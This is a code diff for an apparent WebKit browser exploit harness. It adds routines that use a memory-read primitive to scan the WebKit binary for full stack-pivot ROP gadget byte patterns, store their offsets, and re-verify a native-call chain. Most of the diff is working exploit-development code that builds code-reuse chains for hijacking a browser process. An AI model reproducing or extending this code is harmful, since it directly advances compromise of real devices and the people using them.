@@ -9,13 +9,19 @@ import {
     pivotScanHint,
     PIVOT_ROWS,
     pivotPattern,
+    pivotExecPattern,
+    pivotVerifyPattern,
     verifyPivotSet,
     mergeScannedPivot,
+    mergePivotFullOff,
     loadScannedPivot,
     saveScannedPivot,
+    savePivotFullOverride,
+    clearPivotFullOverride,
     sanitizeScannedPivotStorage,
     G5_PATTERNS,
     checkG5Bytes,
+    checkPivotBytes,
     g5DerivedHint,
     G5_DELTA_FROM_G0,
     G5_EXPM1_DELTA,
@@ -67,7 +73,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ad";
+const BUILD_ID = "rw-20250830ae";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -1180,6 +1186,13 @@ function runManualTest(testId) {
     let pat = test.pat;
     if (test.spKey && off.pivot_view_sp != null)
         pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
+    if (test.group === "pivot" && testId !== "g5") {
+        const row = pivotRowByLabel(test.label);
+        if (row) {
+            const exec = pivotExecPattern(row[0], off);
+            if (exec) pat = exec;
+        }
+    }
     if (rva == null && test.group === "pivot") {
         if (testId === "g5") {
             runG5ClusterProbe();
@@ -1283,12 +1296,71 @@ function logPivotBadBytes(p, webkitBase, off, labels) {
         if (!row) continue;
         const rva = off[row[1]];
         if (rva == null) continue;
-        const pat = pivotPattern(row, off);
-        const n = lab === "G5" ? 6 : Math.max(pat.length, 4);
+        const exec = pivotExecPattern(lab, off);
+        const prefix = pivotPattern(row, off);
+        const pat = exec || prefix;
+        const n = lab === "G5" ? 6 : Math.max(pat.length, 12);
+        let want = "";
+        if (lab === "G5") {
+            want = " (want 52 5c c3 or 48 89 d4 c3)";
+        } else if (exec) {
+            want = " want-full " + fmtBytes(exec);
+            if (exec !== prefix && checkPivotBytes(a => read1p(p, a), webkitBase, rva, prefix))
+                want += " (prefix OK — need FULL gadget)";
+        }
         mark("PIVOT-HEX", lab + " +0x" + rva.toString(16)
-            + " got " + gadgetBytesHex(p, webkitBase, rva, n)
-            + (lab === "G5" ? " (want 52 5c c3 or 48 89 d4 c3)" : ""));
+            + " got " + gadgetBytesHex(p, webkitBase, rva, n) + want);
     }
+}
+
+/** Sync scan for full G0-G4 when HW RVA is prefix-only (OOM on N5). */
+function scanPivotFullForBad(p, webkitBase, off, badLabels) {
+    const hits = {};
+    for (let i = 0; i < badLabels.length; i++) {
+        const lab = badLabels[i].split(" ")[0];
+        if (lab === "G5" || lab === "MOV_RDI_RAX") continue;
+        const row = pivotRowByLabel(lab);
+        if (!row) continue;
+        const key = row[1];
+        const pat = pivotExecPattern(lab, off);
+        if (!pat) continue;
+        const hint = off[key] != null ? off[key] : pivotHint(key);
+        const cap = scanCapOff();
+        const ranges = [];
+        if (hint > 0) {
+            ranges.push({
+                lo: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
+                hi: Math.min(cap, hint + SCAN_NEAR_RADIUS),
+                tag: "near",
+            });
+        }
+        const cluster = pivotClusterRange(off);
+        if (cluster) ranges.push({ lo: cluster.minRva, hi: cluster.maxRva, tag: "cluster" });
+        ranges.push({ lo: SCAN_PIVOT_MIN, hi: Math.min(SCAN_LOW_MAX, cap), tag: "low" });
+        let found = null;
+        for (let ri = 0; ri < ranges.length && found == null; ri++) {
+            const { lo, hi, tag } = ranges[ri];
+            for (let rva = lo & ~7; rva < hi; rva += 8) {
+                if (checkPivotBytes(a => read1p(p, a), webkitBase, rva, pat)) {
+                    found = { rva, tag };
+                    break;
+                }
+            }
+        }
+        if (found) {
+            hits[key] = found.rva;
+            mark("PIVOT-FULL-HIT", lab + " +0x" + found.rva.toString(16)
+                + " (" + found.tag + ") was +0x" + (hint || 0).toString(16));
+        } else {
+            mark("PIVOT-FULL-MISS", lab + " — no full gadget in near/cluster/low");
+        }
+    }
+    if (Object.keys(hits).length) {
+        savePivotFullOverride(webkitBase, hits);
+        mark("PIVOT-FULL-SAVE", Object.keys(hits).join(", ") + " — re-verify");
+        return true;
+    }
+    return false;
 }
 
 function pivotNotReadyMsg(v) {
@@ -1316,6 +1388,7 @@ function clearPivotState() {
         sessionStorage.removeItem("wk-scanned-pivot");
         sessionStorage.removeItem("wk-scanned-pivot-base");
     } catch (_) { }
+    clearPivotFullOverride();
     sanitizeScannedPivotStorage();
     pivotScan = null;
     pivotReady = false;
@@ -1325,6 +1398,7 @@ function clearPivotState() {
 
 function restoreHwPivot() {
     sanitizeScannedPivotStorage();
+    clearPivotFullOverride();
     try {
         sessionStorage.removeItem("wk-pivot-scan-state");
     } catch (_) { }
@@ -1810,6 +1884,8 @@ function loadEffectiveOff() {
     off = Object.assign(off, HW_GADGETS_1352, PIVOT_HW_1352);
     const scanned = loadScannedPivot();
     if (scanned) off = mergeScannedPivot(off, scanned);
+    const wb = chainWebkitBase(off);
+    off = mergePivotFullOff(off, wb);
     if (off.pivot_view_sp == null)
         off.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
     return off;
@@ -1866,8 +1942,10 @@ function pivotScanRange(key, phase, found) {
     };
 }
 
-function pivotScanPatterns(label, pat) {
+function pivotScanPatterns(label, pat, off) {
     if (label === "G5") return G5_PATTERNS.map(g => g.pat);
+    const exec = pivotExecPattern(label, off || loadEffectiveOff());
+    if (exec) return [exec];
     return [pat];
 }
 
@@ -2059,8 +2137,9 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const row = PIVOT_ROWS[pivotScan.rowIdx];
     const key = row[1];
     const label = row[0];
-    const pat = pivotPattern(row, off);
-    const pats = pivotScanPatterns(label, pat);
+    const offScan = loadEffectiveOff();
+    const pat = pivotExecPattern(label, offScan) || pivotPattern(row, offScan);
+    const pats = pivotScanPatterns(label, pat, offScan);
     const patKinds = label === "G5" ? G5_PATTERNS.map(g => g.kind) : null;
     if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
     const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
@@ -2145,7 +2224,10 @@ async function scanPivotRowPhase(p, webkitBase, off) {
 
     if (hit != null) {
         pivotScan.found[key] = hit.rva;
-        saveScannedPivot(webkitBase, pivotScan.found);
+        if (label === "G5")
+            saveScannedPivot(webkitBase, pivotScan.found);
+        else
+            savePivotFullOverride(webkitBase, { [key]: hit.rva });
         if (label === "G5") {
             logG5Cands(pivotScan.g5Cands);
             mark("SCAN-HIT", "G5 +0x" + hit.rva.toString(16)
@@ -2364,6 +2446,30 @@ function verifyPivotManual() {
     if (v.pivot.bad.length) {
         mark("PIVOT-BAD", v.pivot.bad.join(", ") + " — bytes mismatch at RVA");
         logPivotBadBytes(p, webkitBase, off, v.pivot.bad);
+        const prefixOnly = v.pivot.bad.filter(b => b.indexOf("prefix-only") >= 0);
+        if (prefixOnly.length) {
+            mark("PIVOT-FULL-SCAN", "HW prefix hit but full gadget missing — scanning…");
+            if (scanPivotFullForBad(p, webkitBase, off, prefixOnly)) {
+                off = loadEffectiveOff();
+                const v2 = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+                if (v2.pivot.good.length)
+                    mark("PIVOT-OK", v2.pivot.good.join(", "));
+                if (v2.pivot.bad.length) {
+                    mark("PIVOT-BAD", v2.pivot.bad.join(", "));
+                    logPivotBadBytes(p, webkitBase, off, v2.pivot.bad);
+                }
+                pivotReady = v2.ok;
+                if (v2.ok) {
+                    mark("PIVOT-READY", v2.pivot.count + "/" + v2.pivot.total
+                        + " pivot + " + v2.popGood.length + " pop (full-pattern RVAs)");
+                    state("chain OK — bisect N2→N5 or Fire smoke", "ok");
+                } else {
+                    state("chain not ready — " + pivotNotReadyMsg(v2.pivot), "warn");
+                }
+                setUi();
+                return;
+            }
+        }
     }
     if (v.pivot.good.length)
         mark("PIVOT-OK", v.pivot.good.join(", "));
@@ -3592,7 +3698,7 @@ function ensureNativePrep(p, off) {
     mark("NATIVE-PREP", "mainMf " + path + " pivot="
         + (params.get("pivot") === "ta" ? "textarea" : "{}")
         + " cell=" + pivotCell + " G0code="
-        + gadgetBytesHex(p, webkitBase, off.wk_MOV_RDI_RSI_30_CALL, 8));
+        + gadgetBytesHex(p, webkitBase, off.wk_MOV_RDI_RSI_30_CALL, 16));
     pinNativeRetain();
     return nativePrep;
 }
